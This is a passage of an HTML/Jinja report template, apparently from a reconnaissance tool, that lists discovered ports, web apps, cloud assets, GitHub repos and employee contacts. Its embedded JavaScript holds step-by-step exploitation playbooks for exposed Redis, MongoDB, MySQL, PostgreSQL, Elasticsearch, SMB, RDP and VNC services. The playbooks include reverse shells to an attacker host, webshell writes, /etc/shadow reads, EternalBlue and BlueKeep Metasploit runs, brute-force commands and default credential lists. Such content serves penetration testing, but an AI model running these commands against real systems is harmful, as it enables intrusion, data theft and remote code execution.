                                    {% if port.number in [21, 22, 23, 445, 2375, 2376, 2379, 3306, 3389, 5432, 5900, 5984, 6379, 6443, 9200, 11211, 27017, 1433, 8080, 9000] %}
                                    <button class="view-btn" style="padding: 4px 8px; font-size: 11px;" onclick="showServiceGuide({{ port.number }})">🔓</button>
                                    {% else %}
                                    <span style="color: var(--text-muted);">-</span>
                                    {% endif %}
                                </td>
                            </tr>
                            {% endfor %}
                            {% endfor %}
                        </tbody>
                    </table>
                    {% else %}
                    <div class="empty-state">
                        <div class="empty-state-icon">🔌</div>
                        <div>No open ports discovered</div>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- Web Applications with Screenshots -->
            <section id="webapps" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon webapps">🔗</div>
                        <span>Web Applications</span>
                    </div>
                    <div class="section-badge">{{ webapps|length }} found</div>
                </div>
                <div class="section-content">
                    {% if webapps %}
                    <!-- Screenshot Gallery View -->
                    <div class="view-toggle" style="margin-bottom: 16px;">
                        <button class="view-btn active" onclick="showView('gallery')">📷 Gallery View</button>
                        <button class="view-btn" onclick="showView('table')">📋 Table View</button>
                    </div>

                    <div id="gallery-view" class="screenshot-gallery">
                        {% for webapp in webapps %}
                        <div class="screenshot-card">
                            <div class="screenshot-image">
                                {% if webapp.screenshot_base64 %}
                                <img src="data:image/png;base64,{{ webapp.screenshot_base64 }}" alt="{{ webapp.url }}" onclick="openModal(this.src, '{{ webapp.url }}')">
                                {% elif webapp.screenshot_path %}
                                <img src="file://{{ webapp.screenshot_path }}" alt="{{ webapp.url }}" onclick="openModal(this.src, '{{ webapp.url }}')">
                                {% else %}
                                <div class="no-screenshot">
                                    <span>📷</span>
                                    <span>No Screenshot</span>
                                </div>
                                {% endif %}
                            </div>
                            <div class="screenshot-info">
                                <div class="screenshot-url">
                                    <a href="{{ webapp.url }}" target="_blank">{{ webapp.host }}</a>
                                    <span class="tag {% if webapp.status_code == 200 %}tag-alive{% elif webapp.status_code >= 300 and webapp.status_code < 400 %}tag-info{% elif webapp.status_code >= 400 %}tag-dead{% else %}tag-info{% endif %}">
                                        {{ webapp.status_code }}
                                    </span>
                                </div>
                                <div class="screenshot-title">{{ webapp.title or 'No title' }}</div>
                                <div class="screenshot-techs">
                                    {% for tech in webapp.technologies[:3] %}
                                    <span class="tag tag-tech">{{ tech.name }}</span>
                                    {% endfor %}
                                </div>
                            </div>
                        </div>
                        {% endfor %}
                    </div>

                    <div id="table-view" class="hidden">
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>Screenshot</th>
                                    <th>URL</th>
                                    <th>Title</th>
                                    <th>Status</th>
                                    <th>Technologies</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for webapp in webapps %}
                                <tr>
                                    <td>
                                        {% if webapp.screenshot_base64 %}
                                        <img src="data:image/png;base64,{{ webapp.screenshot_base64 }}" class="table-thumbnail" onclick="openModal(this.src, '{{ webapp.url }}')">
                                        {% elif webapp.screenshot_path %}
                                        <img src="file://{{ webapp.screenshot_path }}" class="table-thumbnail" onclick="openModal(this.src, '{{ webapp.url }}')">
                                        {% else %}
                                        <span class="tag tag-dead">No img</span>
                                        {% endif %}
                                    </td>
                                    <td class="mono"><a href="{{ webapp.url }}" target="_blank" style="color: var(--accent-primary);">{{ webapp.url }}</a></td>
                                    <td>{{ webapp.title or '-' }}</td>
                                    <td>
                                        <span class="tag {% if webapp.status_code == 200 %}tag-alive{% else %}tag-info{% endif %}">
                                            {{ webapp.status_code }}
                                        </span>
                                    </td>
                                    <td>
                                        <div class="tech-grid">
                                            {% for tech in webapp.technologies[:5] %}
                                            <span class="tag tag-tech">{{ tech.name }}</span>
                                            {% endfor %}
                                        </div>
                                    </td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                    {% else %}
                    <div class="empty-state">
                        <div class="empty-state-icon">🔗</div>
                        <div>No web applications discovered</div>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- Cloud Assets -->
            <section id="cloud" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon cloud">☁️</div>
                        <span>Cloud Assets</span>
                    </div>
                    <div class="section-badge">{{ cloud_assets|length }} found</div>
                </div>
                <div class="section-content">
                    {% if cloud_assets %}
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>Provider</th>
                                <th>Type</th>
                                <th>Name</th>
                                <th>URL</th>
                                <th>Public</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for asset in cloud_assets %}
                            <tr>
                                <td><span class="tag tag-tech">{{ asset.provider.value }}</span></td>
                                <td>{{ asset.asset_type.value }}</td>
                                <td class="mono">{{ asset.name }}</td>
                                <td class="mono">{{ asset.url or '-' }}</td>
                                <td>
                                    {% if asset.is_public %}
                                    <span class="tag tag-critical">PUBLIC</span>
                                    {% else %}
                                    <span class="tag tag-info">Private</span>
                                    {% endif %}
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                    {% else %}
                    <div class="empty-state">
                        <div class="empty-state-icon">☁️</div>
                        <div>No cloud assets discovered</div>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- GitHub Intelligence -->
            <section id="github" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon github">🐙</div>
                        <span>GitHub Intelligence</span>
                    </div>
                    <div class="section-badge">{{ github_repos|length if github_repos else 0 }} repos</div>
                </div>
                <div class="section-content">
                    {% if github_repos %}
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>Repository</th>
                                <th>Description</th>
                                <th>Language</th>
                                <th>Stars</th>
                                <th>Updated</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for repo in github_repos %}
                            <tr>
                                <td><a href="{{ repo.url }}" target="_blank" class="link-external">{{ repo.name }}</a></td>
                                <td>{{ repo.description[:80] if repo.description else '-' }}{{ '...' if repo.description and repo.description|length > 80 else '' }}</td>
                                <td><span class="tag tag-tech">{{ repo.language or 'Unknown' }}</span></td>
                                <td>⭐ {{ repo.stars }}</td>
                                <td>{{ repo.updated_at[:10] if repo.updated_at else '-' }}</td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>

                    {% if github_emails %}
                    <h4 style="margin-top: 20px; margin-bottom: 10px; color: var(--text-secondary);">Discovered Commit Emails</h4>
                    <div class="tech-grid">
                        {% for email in github_emails[:30] %}
                        <span class="tag tag-info">{{ email }}</span>
                        {% endfor %}
                        {% if github_emails|length > 30 %}
                        <span class="tag tag-muted">+{{ github_emails|length - 30 }} more</span>
                        {% endif %}
                    </div>
                    {% endif %}
                    {% else %}
                    <div class="empty-state">
                        <div class="empty-state-icon">🐙</div>
                        <div>No GitHub repositories discovered</div>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- Employees -->
            <section id="employees" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon employees">👤</div>
                        <span>Employees &amp; Contacts</span>
                    </div>
                    <div class="section-badge">{{ employees|length if employees else 0 }} found</div>
                </div>
                <div class="section-content">
                    {% if employees %}
                    {% if email_pattern %}
                    <div class="alert alert-info" style="margin-bottom: 15px;">
                        <strong>Email Pattern Detected:</strong> {{ email_pattern }}@domain.com
                    </div>
                    {% endif %}
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>Email</th>
                                <th>Name</th>
                                <th>Position</th>
                                <th>Department</th>
                                <th>Source</th>
                                <th>Links</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for emp in employees %}
                            <tr>
                                <td class="mono">{{ emp.email }}</td>
                                <td>{{ emp.first_name }} {{ emp.last_name }}</td>
                                <td>
                                    {% if emp.position %}
                                    {% set pos_lower = emp.position|lower %}
                                    {% if 'ceo' in pos_lower or 'cto' in pos_lower or 'cfo' in pos_lower or 'chief' in pos_lower or 'president' in pos_lower or 'founder' in pos_lower or 'director' in pos_lower or 'vp' in pos_lower %}
                                    <span class="tag tag-warning">{{ emp.position }}</span>
                                    {% else %}
                                    {{ emp.position }}
                                    {% endif %}
                                    {% else %}-{% endif %}
                                </td>
                                <td>{{ emp.department or '-' }}</td>
                                <td><span class="tag tag-info">{{ emp.source }}</span></td>
                                <td>
                                    {% if emp.linkedin %}<a href="{{ emp.linkedin }}" target="_blank" class="link-external">LinkedIn</a>{% endif %}
                                    {% if emp.twitter %}<a href="https://twitter.com/{{ emp.twitter }}" target="_blank" class="link-external">Twitter</a>{% endif %}
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                    {% else %}
                    <div class="empty-state">
                        <div class="empty-state-icon">👤</div>
                        <div>No employees discovered</div>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- Technologies Summary -->
            <section id="technologies" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon tech">⚙️</div>
                        <span>Technology Stack</span>
                    </div>
                </div>
                <div class="section-content">
                    {% if tech_summary %}
                    <div class="tech-grid">
                        {% for tech, count in tech_summary.items() %}
                        <span class="tag tag-tech">{{ tech }} ({{ count }})</span>
                        {% endfor %}
                    </div>
                    {% else %}
                    <div class="empty-state">
                        <div class="empty-state-icon">⚙️</div>
                        <div>No technologies detected</div>
                    </div>
                    {% endif %}
                </div>
            </section>
        </div>
    </main>

    <!-- Screenshot Modal -->
    <div id="screenshotModal" class="modal" onclick="closeModal(event)">
        <div class="modal-content">
            <span class="modal-close" onclick="closeModal()">&times;</span>
            <img id="modalImage" src="" alt="Screenshot">
            <div class="modal-url">
                <a id="modalUrl" href="" target="_blank"></a>
            </div>
        </div>
    </div>

    <!-- Service Guidance Modal -->
    <div id="serviceGuideModal" class="modal" onclick="closeServiceGuide(event)">
        <div class="modal-content" style="max-width: 800px; max-height: 90vh; overflow-y: auto; background: var(--bg-surface); border-radius: var(--radius-lg); padding: 24px;">
            <span class="modal-close" onclick="closeServiceGuide()">&times;</span>
            <div id="serviceGuideContent"></div>
        </div>
    </div>

    <style>
        .service-guide { color: var(--text-primary); }
        .service-guide h3 {
            display: flex; align-items: center; gap: 12px;
            margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid var(--border-subtle);
        }
        .service-guide .risk-badge {
            padding: 4px 12px; border-radius: 4px; font-size: 11px; font-weight: 600; text-transform: uppercase;
        }
        .service-guide .risk-critical { background: var(--color-danger-muted); color: var(--color-danger); }
        .service-guide .risk-high { background: var(--color-warning-muted); color: var(--color-warning); }
        .service-guide .risk-medium { background: var(--color-info-muted); color: var(--color-info); }
        .service-guide .risk-low { background: var(--color-success-muted); color: var(--color-success); }
        .service-guide .risk-info { background: var(--bg-elevated); color: var(--text-secondary); }
        .service-guide .desc { color: var(--text-secondary); margin-bottom: 20px; line-height: 1.6; }
        .service-guide section { margin-bottom: 20px; }
        .service-guide h4 {
            color: var(--text-primary); font-size: 14px; font-weight: 600;
            margin-bottom: 10px; display: flex; align-items: center; gap: 8px;
        }
        .service-guide ul, .service-guide ol {
            margin: 0; padding-left: 20px; color: var(--text-secondary);
        }
        .service-guide li { margin-bottom: 6px; line-height: 1.5; }
        .service-guide code {
            background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px;
            font-family: monospace; font-size: 12px; color: var(--accent-primary);
        }
        .service-guide .creds-list {
            display: flex; flex-wrap: wrap; gap: 8px; margin-top: 8px;
        }
        .service-guide .cred-item {
            background: var(--color-warning-muted); color: var(--color-warning);
            padding: 4px 10px; border-radius: 4px; font-family: monospace; font-size: 12px;
        }
        .service-guide .ref-link {
            color: var(--accent-primary); text-decoration: none; word-break: break-all;
        }
        .service-guide .ref-link:hover { text-decoration: underline; }
        .service-guide .tools-list {
            display: flex; flex-wrap: wrap; gap: 8px;
        }
        .service-guide .tool-item {
            background: var(--accent-primary-muted); color: var(--accent-primary);
            padding: 4px 10px; border-radius: 4px; font-size: 12px;
        }
        .service-guide .cve-item {
            background: var(--color-danger-muted); color: var(--color-danger);
            padding: 4px 10px; border-radius: 4px; font-size: 12px; margin-right: 8px; margin-bottom: 8px; display: inline-block;
        }
    </style>

    <script>
        function toggleSection(header) {
            const content = header.nextElementSibling;
            content.classList.toggle('collapsed');
            header.classList.toggle('collapsed');
        }

        function filterTable(input, tableId) {
            const filter = input.value.toLowerCase();
            const table = document.getElementById(tableId);
            const rows = table.getElementsByTagName('tr');

            for (let i = 1; i < rows.length; i++) {
                const cells = rows[i].getElementsByTagName('td');
                let found = false;
                for (let j = 0; j < cells.length; j++) {
                    if (cells[j].textContent.toLowerCase().includes(filter)) {
                        found = true;
                        break;
                    }
                }
                rows[i].style.display = found ? '' : 'none';
            }
        }

        // View toggle for screenshots
        function showView(view) {
            const galleryView = document.getElementById('gallery-view');
            const tableView = document.getElementById('table-view');

            if (view === 'gallery') {
                galleryView.classList.remove('hidden');
                tableView.classList.add('hidden');
            } else {
                galleryView.classList.add('hidden');
                tableView.classList.remove('hidden');
            }

            // Update button states
            const container = event.target.parentElement;
            container.querySelectorAll('.view-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
        }

        // Filter subdomains by status
        function filterSubdomains(filter, btn) {
            const table = document.getElementById('subdomains-table');
            const rows = table.querySelectorAll('tbody tr');

            rows.forEach(row => {
                const isAlive = row.dataset.alive === 'true';
                if (filter === 'all') {
                    row.style.display = '';
                } else if (filter === 'alive') {
                    row.style.display = isAlive ? '' : 'none';
                } else if (filter === 'dead') {
                    row.style.display = isAlive ? 'none' : '';
                }
            });

            // Update button states
            const container = btn.parentElement;
            container.querySelectorAll('.view-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        }

        // Modal functions
        function openModal(imageSrc, url) {
            try {
                console.log('openModal called with URL:', url);
                const modal = document.getElementById('screenshotModal');
                const modalImg = document.getElementById('modalImage');
                const modalUrl = document.getElementById('modalUrl');

                if (!modal || !modalImg || !modalUrl) {
                    console.error('Modal elements not found:', {modal, modalImg, modalUrl});
                    return;
                }

                modal.classList.add('active');
                modalImg.src = imageSrc;
                modalUrl.href = url;
                modalUrl.textContent = url;

                document.body.style.overflow = 'hidden';
                console.log('Modal should now be visible');
            } catch (e) {
                console.error('Error in openModal:', e);
            }
        }

        function closeModal(event) {
            if (event && event.target !== event.currentTarget && !event.target.classList.contains('modal-close')) {
                return;
            }
            const modal = document.getElementById('screenshotModal');
            modal.classList.remove('active');
            document.body.style.overflow = 'auto';
        }

        // Close modal on Escape key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeModal();
                closeServiceGuide();
            }
        });

        // Service Exploitation Guides - Detailed attack techniques
        const serviceGuides = {
            27017: {
                name: "MongoDB",
                risk: "critical",
                description: "MongoDB NoSQL database - typically no authentication when exposed. Allows complete data access and potential RCE.",
                attacks: [
                    {
                        title: "1. Connect & Enumerate",
                        commands: [
                            "mongo <ip>:27017",
                            "show dbs",
                            "use <database>",
                            "show collections",
                            "db.<collection>.find().pretty()"
                        ]
                    },
                    {
                        title: "2. Dump All Data",
                        commands: [
                            "mongodump --host <ip> --port 27017 --out /tmp/dump",
                            "mongoexport --host <ip> --db <db> --collection <col> --out data.json"
                        ]
                    },
                    {
                        title: "3. Search for Credentials",
                        commands: [
                            "db.<collection>.find({$or: [{password: {$exists: true}}, {passwd: {$exists: true}}, {pwd: {$exists: true}}]})",
                            "db.<collection>.find({email: /@/})",
                            "db.users.find()"
                        ]
                    },
                    {
                        title: "4. Server-Side JavaScript Execution",
                        commands: [
                            "db.users.find({$where: 'sleep(5000)'})",
                            "db.users.find({$where: function() { return this.a == this.b; }})"
                        ]
                    }
                ],
                credentials: ["No authentication by default"],
                cves: ["CVE-2017-2638", "CVE-2019-2389"],
                tools: ["mongo CLI", "mongodump", "mongoexport", "Nmap: nmap -sV --script mongodb-info <ip>", "Metasploit: use auxiliary/scanner/mongodb/mongodb_login"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb"]
            },
            6379: {
                name: "Redis",
                risk: "critical",
                description: "Redis in-memory database - no auth by default. Can achieve RCE via SSH key injection or cron jobs.",
                attacks: [
                    {
                        title: "1. Connect & Enumerate",
                        commands: [
                            "redis-cli -h <ip>",
                            "INFO",
                            "CONFIG GET *",
                            "KEYS *",
                            "GET <key>"
                        ]
                    },
                    {
                        title: "2. RCE via SSH Key Injection",
                        commands: [
                            "redis-cli -h <ip>",
                            "CONFIG SET dir /root/.ssh",
                            "CONFIG SET dbfilename authorized_keys",
                            "SET ssh_key '\\n\\nssh-rsa AAAAB3NzaC1yc2E... user@host\\n\\n'",
                            "SAVE",
                            "# Then: ssh -i id_rsa root@<ip>"
                        ]
                    },
                    {
                        title: "3. RCE via Cron Job",
                        commands: [
                            "redis-cli -h <ip>",
                            "CONFIG SET dir /var/spool/cron/crontabs",
                            "CONFIG SET dbfilename root",
                            "SET cron '\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1\\n\\n'",
                            "SAVE"
                        ]
                    },
                    {
                        title: "4. RCE via Webshell (if web root known)",
                        commands: [
                            "CONFIG SET dir /var/www/html",
                            "CONFIG SET dbfilename shell.php",
                            "SET webshell '<?php system($_GET[cmd]); ?>'",
                            "SAVE",
                            "# Access: http://<ip>/shell.php?cmd=id"
                        ]
                    },
                    {
                        title: "5. Dump All Data",
                        commands: [
                            "redis-cli -h <ip> --scan",
                            "redis-cli -h <ip> KEYS '*' | xargs -L1 redis-cli -h <ip> GET"
                        ]
                    }
                ],
                credentials: ["No authentication by default"],
                cves: ["CVE-2022-0543 (Lua sandbox escape)", "CVE-2015-8080", "CVE-2015-4335"],
                tools: ["redis-cli", "redis-rogue-server", "Nmap: nmap --script redis-info -p 6379 <ip>", "Metasploit: use auxiliary/scanner/redis/redis_server"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"]
            },
            9200: {
                name: "Elasticsearch",
                risk: "high",
                description: "Elasticsearch search engine - exposes all indexed data via REST API. Often contains logs, PII, credentials.",
                attacks: [
                    {
                        title: "1. Enumerate Cluster & Indices",
                        commands: [
                            "curl -X GET 'http://<ip>:9200/'",
                            "curl -X GET 'http://<ip>:9200/_cat/indices?v'",
                            "curl -X GET 'http://<ip>:9200/_cat/nodes?v'",
                            "curl -X GET 'http://<ip>:9200/_cluster/health?pretty'"
                        ]
                    },
                    {
                        title: "2. Dump Index Data",
                        commands: [
                            "curl -X GET 'http://<ip>:9200/<index>/_search?pretty&size=1000'",
                            "curl -X GET 'http://<ip>:9200/<index>/_search?q=password&pretty'",
                            "curl -X GET 'http://<ip>:9200/_all/_search?q=password&pretty'"
                        ]
                    },
                    {
                        title: "3. Search for Sensitive Data",
                        commands: [
                            "curl -X GET 'http://<ip>:9200/_all/_search?q=password OR secret OR api_key&pretty'",
                            "curl -X GET 'http://<ip>:9200/_all/_search?q=credit_card OR ssn&pretty'",
                            "curl -X GET 'http://<ip>:9200/_all/_search' -d '{query:{match_all:{}}}' -H 'Content-Type: application/json'"
                        ]
                    },
                    {
                        title: "4. Bulk Data Exfiltration (Scroll API)",
                        commands: [
                            "elasticdump --input=http://<ip>:9200/<index> --output=dump.json --type=data"
                        ]
                    },
                    {
                        title: "5. RCE (Older Versions < 1.2)",
                        commands: [
                            "# CVE-2014-3120 - Groovy script execution",
                            "# CVE-2014-3120: curl -X POST 'http://<ip>:9200/_search?pretty' with Groovy script payload",
                        ]
                    }
                ],
                credentials: ["No authentication by default (without X-Pack)"],
                cves: ["CVE-2014-3120 (RCE)", "CVE-2015-1427 (Groovy RCE)", "CVE-2015-3337 (Directory traversal)"],
                tools: ["curl", "elasticdump", "Nmap: nmap -p 9200 --script elasticsearch-info <ip>"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch"]
            },
            3306: {
                name: "MySQL",
                risk: "high",
                description: "MySQL database - can read/write files on server, potentially achieve RCE via UDF or INTO OUTFILE.",
                attacks: [
                    {
                        title: "1. Brute Force Credentials",
                        commands: [
                            "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<ip>",
                            "nmap --script mysql-brute -p 3306 <ip>",
                            "medusa -h <ip> -u root -P passwords.txt -M mysql"
                        ]
                    },
                    {
                        title: "2. Connect & Enumerate",
                        commands: [
                            "mysql -h <ip> -u root -p",
                            "SHOW DATABASES;",
                            "USE <database>;",
                            "SHOW TABLES;",
                            "SELECT * FROM users;"
                        ]
                    },
                    {
                        title: "3. Read Files from Server",
                        commands: [
                            "SELECT LOAD_FILE('/etc/passwd');",
                            "SELECT LOAD_FILE('/etc/shadow');",
                            "SELECT LOAD_FILE('/var/www/html/config.php');"
                        ]
                    },
                    {
                        title: "4. Write Webshell (INTO OUTFILE)",
                        commands: [
                            "SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
                            "# Access: http://<ip>/shell.php?cmd=id"
                        ]
                    },
                    {
                        title: "5. UDF Exploitation for RCE",
                        commands: [
                            "# Compile UDF: gcc -g -shared -o raptor_udf2.so raptor_udf2.c",
                            "# Upload and create function",
                            "USE mysql;",
                            "CREATE TABLE foo(line blob);",
                            "INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));",
                            "SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';",
                            "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';",
                            "SELECT do_system('id > /tmp/out; cat /tmp/out');"
                        ]
                    }
                ],
                credentials: ["root (no password)", "root:root", "root:mysql", "root:toor", "mysql:mysql", "admin:admin"],
                cves: ["CVE-2012-2122 (Auth bypass)", "CVE-2016-6662 (RCE)"],
                tools: ["mysql CLI", "Hydra", "Nmap: nmap --script mysql-* -p 3306 <ip>", "SQLMap", "Metasploit: use auxiliary/scanner/mysql/mysql_login"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"]
            },
            5432: {
                name: "PostgreSQL",
                risk: "high",
                description: "PostgreSQL database - superuser can execute OS commands via COPY TO PROGRAM.",
                attacks: [
                    {
                        title: "1. Brute Force Credentials",
                        commands: [
                            "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<ip>",
                            "nmap --script pgsql-brute -p 5432 <ip>"
                        ]
                    },
                    {
                        title: "2. Connect & Enumerate",
                        commands: [
                            "psql -h <ip> -U postgres",
                            "\\\\l  -- List databases",
                            "\\\\c <database>  -- Connect to database",
                            "\\\\dt  -- List tables",
                            "SELECT * FROM users;"
                        ]
                    },
                    {
                        title: "3. RCE via COPY TO PROGRAM (Superuser)",
                        commands: [
                            "CREATE TABLE cmd_exec(cmd_output text);",
                            "COPY cmd_exec FROM PROGRAM 'id';",
                            "SELECT * FROM cmd_exec;",
                            "COPY cmd_exec FROM PROGRAM 'cat /etc/passwd';",
                            "# Reverse shell:",
                            "COPY cmd_exec FROM PROGRAM 'bash -c bash -i >& /dev/tcp/<attacker>/4444 0>&1';"
                        ]
                    },
                    {
                        title: "4. Read Files",
                        commands: [
                            "SELECT pg_read_file('/etc/passwd');",
                            "SELECT pg_read_file('/var/lib/postgresql/.pgpass');",
                            "CREATE TABLE temp(data text);",
                            "COPY temp FROM '/etc/passwd';",
                            "SELECT * FROM temp;"
                        ]
                    },
                    {
                        title: "5. Write Files via Large Objects",
                        commands: [
                            "SELECT lo_creat(-1);  -- Returns OID",
                            "INSERT INTO pg_largeobject VALUES (<oid>, 0, decode('<?php system($_GET[c]); ?>', 'escape'));",
                            "SELECT lo_export(<oid>, '/var/www/html/shell.php');"
                        ]
                    }
                ],
                credentials: ["postgres:postgres", "postgres (no password)", "pgsql:pgsql"],
                cves: ["CVE-2019-9193 (COPY FROM PROGRAM)"],
                tools: ["psql", "pgcli", "Hydra", "Nmap: nmap --script pgsql-brute -p 5432 <ip>", "Metasploit: use auxiliary/scanner/postgres/postgres_login"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql"]
            },
            445: {
                name: "SMB",
                risk: "critical",
                description: "SMB file sharing - extremely dangerous. EternalBlue, data theft, hash capture, lateral movement.",
                attacks: [
                    {
                        title: "1. Enumerate Shares",
                        commands: [
                            "smbclient -L //<ip> -N",
                            "smbmap -H <ip>",
                            "crackmapexec smb <ip> --shares",
                            "nmap --script smb-enum-shares -p 445 <ip>"
                        ]
                    },
                    {
                        title: "2. Access Shares & Download Files",
                        commands: [
                            "smbclient //<ip>/<share> -N",
                            "smbget -R smb://<ip>/<share>",
                            "# Inside smbclient: get <file>, mget *, recurse ON, prompt OFF"
                        ]
                    },
                    {
                        title: "3. EternalBlue Exploitation (MS17-010)",
                        commands: [
                            "nmap --script smb-vuln-ms17-010 -p 445 <ip>",
                            "msfconsole",
                            "use exploit/windows/smb/ms17_010_eternalblue",
                            "set RHOSTS <ip>",
                            "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                            "set LHOST <attacker>",
                            "exploit"
                        ]
                    },
                    {
                        title: "4. SMBGhost (CVE-2020-0796)",
                        commands: [
                            "nmap --script smb-protocols -p 445 <ip>  # Check for SMBv3.1.1",
                            "python3 smbghost_cve-2020-0796.py <ip>",
                            "# Metasploit: use exploit/windows/smb/cve_2020_0796_smbghost"
                        ]
                    },
                    {
                        title: "5. Capture NTLM Hashes (Responder)",
                        commands: [
                            "responder -I eth0 -wrf",
                            "# Or force connection: net use \\\\\\\\<attacker>\\\\share",
                            "# Crack captured hash:",
                            "hashcat -m 5600 hash.txt wordlist.txt"
                        ]
                    },
                    {
                        title: "6. PsExec / Remote Execution",
                        commands: [
                            "psexec.py <domain>/<user>:<password>@<ip>",
                            "wmiexec.py <domain>/<user>:<password>@<ip>",
                            "crackmapexec smb <ip> -u <user> -p <pass> -x 'whoami'"
                        ]
                    }
                ],
                credentials: ["guest (no password)", "administrator:password", "admin:admin"],
                cves: ["CVE-2017-0144 (EternalBlue)", "CVE-2020-0796 (SMBGhost)", "CVE-2017-0143", "CVE-2008-4250 (MS08-067)"],
                tools: ["smbclient", "smbmap", "CrackMapExec", "Impacket (psexec.py, smbexec.py)", "Responder", "Metasploit EternalBlue", "enum4linux"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"]
            },
            3389: {
                name: "RDP",
                risk: "high",
                description: "Remote Desktop Protocol - brute force, BlueKeep RCE, session hijacking.",
                attacks: [
                    {
                        title: "1. Brute Force Credentials",
                        commands: [
                            "hydra -l administrator -P passwords.txt rdp://<ip>",
                            "ncrack -u administrator -P passwords.txt <ip>:3389",
                            "crowbar -b rdp -s <ip>/32 -u admin -C passwords.txt"
                        ]
                    },
                    {
                        title: "2. BlueKeep Exploitation (CVE-2019-0708)",
                        commands: [
                            "nmap --script rdp-vuln-ms12-020,rdp-ntlm-info -p 3389 <ip>",
                            "msfconsole",
                            "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
                            "set RHOSTS <ip>",
                            "set TARGET <target_number>",
                            "exploit"
                        ]
                    },
                    {
                        title: "3. Connect with Valid Credentials",
                        commands: [
                            "xfreerdp /u:<user> /p:<password> /v:<ip>",
                            "rdesktop -u <user> -p <password> <ip>",
                            "# Pass-the-hash:",
                            "xfreerdp /u:<user> /pth:<ntlm_hash> /v:<ip>"
                        ]
                    },
                    {
                        title: "4. Session Hijacking (Local Admin)",
                        commands: [
                            "# On compromised system:",
                            "query user",
                            "tscon <session_id> /dest:console",
                            "# Or use Mimikatz: ts::sessions"
                        ]
                    },
                    {
                        title: "5. Enable RDP via Registry (Post-Exploit)",
                        commands: [
                            "reg add 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f",
                            "netsh firewall set service remotedesktop enable"
                        ]
                    }
                ],
                credentials: ["administrator:password", "admin:admin", "administrator:P@ssw0rd"],
                cves: ["CVE-2019-0708 (BlueKeep)", "CVE-2019-1181 (DejaBlue)", "CVE-2019-1182", "CVE-2012-0002 (MS12-020)"],
                tools: ["xfreerdp", "rdesktop", "Hydra", "Crowbar", "Ncrack", "Metasploit BlueKeep"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp"]
            },
            5900: {
                name: "VNC",
                risk: "high",
                description: "VNC remote desktop - often weak/no passwords. Traffic is cleartext by default.",
                attacks: [
                    {
                        title: "1. Brute Force Password",
                        commands: [
                            "hydra -P passwords.txt vnc://<ip>",
                            "nmap --script vnc-brute -p 5900 <ip>",
                            "medusa -h <ip> -M vnc -P passwords.txt"
                        ]
                    },
                    {
                        title: "2. Connect with No/Blank Password",
                        commands: [
                            "vncviewer <ip>:5900",
                            "# If prompted for password, try blank or common ones"
                        ]
                    },
                    {
                        title: "3. Authentication Bypass (Some Versions)",
                        commands: [
                            "nmap --script vnc-info -p 5900 <ip>",
                            "# Check for security type 'None' (Type 1)",
                            "msfconsole",
                            "use auxiliary/scanner/vnc/vnc_none_auth"
                        ]
                    },
                    {
                        title: "4. Decrypt VNC Password from Registry/File",
                        commands: [
                            "# Windows: HKCU\\\\Software\\\\ORL\\\\WinVNC3\\\\Password",
                            "# Linux: ~/.vnc/passwd",
                            "vncpwd <encrypted_password>",
                            "# Online: https://github.com/trinitronx/vncpasswd.py"
                        ]
                    },
                    {
                        title: "5. Screenshot/Record Session",
                        commands: [
                            "vncsnapshot <ip>:0 screenshot.jpg",
                            "# Record with ffmpeg after connecting"
                        ]
                    }
                ],
                credentials: ["(blank)", "password", "vnc", "1234", "admin", "123456"],
                cves: ["CVE-2019-15678", "CVE-2019-8287", "CVE-2006-2369"],
                tools: ["vncviewer", "Hydra", "vncpwd", "Metasploit vnc_login", "vncsnapshot"],
